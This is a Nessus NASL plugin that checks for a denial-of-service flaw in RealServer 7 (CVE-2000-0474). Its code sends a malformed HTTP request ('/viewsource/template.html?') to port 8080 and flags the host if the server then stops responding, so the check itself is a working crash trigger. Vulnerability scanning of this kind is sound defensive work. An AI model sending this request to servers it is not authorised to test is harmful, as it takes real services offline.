#
# This script was written by John Lampe (j_lampe@bellsouth.net)
#
#
# See the Nessus Scripts License for details
#
if(description)
{
  script_id(10461);
  script_bugtraq_id(1288);
 script_version ("$Revision: 1.12 $");
  script_cve_id("CVE-2000-0474");
  script_name(english:"Check for RealServer DoS");
  desc["english"] = "
It is possible to crash a RealServer version 7 by sending a malformed http
request.

Solution : Upgrade to the most recent version of RealServer
Risk factor : High";

  script_description(english:desc["english"]);
  script_summary(english:"Test for DoS in RealServer 7");
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
  script_copyright(english:"By John Lampe....j_lampe@bellsouth.net");
  script_dependencies("find_service.nes");
  script_require_ports("Services/realserver", 7070, 8080);   #port 7070, which may be indicative of server on 8080
  exit(0);
}



#
# The script code starts here
include("http_func.inc");

port = 8080;
if(get_port_state(port)) 
{
    if(http_is_dead(port:port))exit(0);
    
    mysoc = http_open_socket(port);
    if (mysoc) { 
      mystring = http_get(item:"/viewsource/template.html?",
      			  port:port);
      send(socket:mysoc, data:mystring);
    }
    else exit(0);
    http_close_socket(mysoc);
    if(http_is_dead(port:port))security_hole(port);
}
